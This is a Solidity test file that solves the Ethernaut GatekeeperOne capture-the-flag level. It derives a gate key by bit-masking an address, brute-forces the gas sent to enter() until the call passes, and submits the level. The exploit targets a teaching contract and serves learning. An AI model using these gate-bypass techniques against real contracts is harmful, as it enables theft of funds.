pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../GatekeeperOne/GatekeeperOneHackDan.sol";
import "../GatekeeperOne/GatekeeperOneFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract GatekeeperOneTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testGatekeeperOneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));
        vm.stopPrank();

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        GatekeeperOneHackDan hack = new GatekeeperOneHackDan(levelAddress);

        bytes8 _gateKey = bytes8(uint64(uint160(address(this)))) & bytes8(0xffffffff0000ffff);

       for (uint i = 0; i <= 8191; i++) {
            try ethernautGatekeeperOne.enter{gas: 73990+i}(_gateKey) {
                emit log_named_uint("Pass - Gas", 73990+i);
                break;
            } catch {
                emit log_named_uint("Fail - Gas", 73990+i);
            }
        }
        
        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        vm.startPrank(tx.origin);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}